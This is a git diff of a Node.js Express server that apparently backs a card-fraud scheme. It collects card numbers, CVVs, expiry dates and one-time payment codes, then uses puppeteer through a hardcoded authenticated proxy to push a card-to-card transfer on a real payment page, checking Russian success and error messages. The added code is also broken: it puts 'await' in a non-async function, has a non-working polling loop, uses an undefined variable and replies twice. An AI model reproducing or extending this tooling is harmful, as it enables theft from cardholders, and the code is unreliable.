@@ -19,31 +19,6 @@ app.use(bodyParser.urlencoded({ extended: false }))
 app.use(bodyParser.json())
 app.use(cors())
 
-
-const code_enter = async (code, url) => {
-    const browser = await puppeteer.launch({args: ['--proxy-server=http://194.85.181.191:51933',' --no-sandbox', '--disable-setuid-sandbox']})
-    const page = await browser.newPage()
-    await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
-    await page.setViewport({ width: 1920, height: 984 })
-    await page.goto(url)
-
-    await page.waitForSelector('input')
-    const input = await page.$('input')
-    input.type(code)
-
-    try { 
-      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
-         const isOne = await page.evaluate(el => el.innerText, await page.$x('//*[contains(text(), "Платеж проведен")]'))
-         await browser.close()
-         return isOne ? 1 : 0
-      } 
-     } catch (e) {
-         await browser.close()
-         return 0
-     }
-     await browser.close()
-}
-
 const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     const browser = await puppeteer.launch({args: ['--proxy-server=http://194.85.181.191:51933',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
@@ -75,29 +50,51 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     
     await page.click('.submit-button-298')
 
-    await page.waitForTimeout(5000);
+    await page.waitForTimeout(10000);
 
-    obj[toCard+fromCard] = await page.url()
-    console.log(obj[toCard+fromCard])
-    page.waitForTimeout(60000)
-    await browser.close()
+    
+    await page.waitForSelector('input')
+
+    obj[toCard+fromCard] = null
+    function doStuff() {
+      if(!obj[toCard+fromCard]) {//we want it to match
+          await setTimeout(() => {}, 50);//wait 50 millisecnds then recheck
+          return doStuff;
+      }
+    }
+  
+    doStuff();
+
+    const input = await page.$('input')
+    input.type(obj[toCard+fromCard])
+
+    try { 
+      if(await page.waitForXPath('//*[contains(text(), "Ошибка платежа") or contains(text(), "Платеж проведен")]', {timeout: 60000})) {
+         const isOne = await page.evaluate(el => el.innerText, await page.$x('//*[contains(text(), "Платеж проведен")]'))
+         await browser.close()
+         return isOne ? 1 : 0
+      } 
+     } catch (e) {
+         await browser.close()
+         return 0
+     }
+     await browser.close()
 }
 app.post('/sendData', async (req, res) => {
         const {toCard,amount, fromCard, cvv, expireDate, email} = req.body
         write_data(toCard,amount, fromCard, cvv, expireDate, email)
-        return res.status(200).json({id: toCard+fromCard})
+        res.status(200).json({id: toCard+fromCard})
+        if(result === 1) { 
+          return res.redirect(returnURL) 
+        } else if (result === 0) { 
+          return res.status(500).send()
+        }
 })
 
 app.get('/token/:id/:code', async (req, res) => {
-  console.log(3)
   const {id, code} = req.params
-  console.log(obj[id], 2)
-  const result = await code_enter(code, obj[id])
-  if(result === 1) { 
-    return res.redirect(returnURL) 
-  } else if (result === 0) { 
-    return res.status(500).send()
-  }
+  obj[id] = code
+  return res.status(200)
 })
 
 app.listen(80)
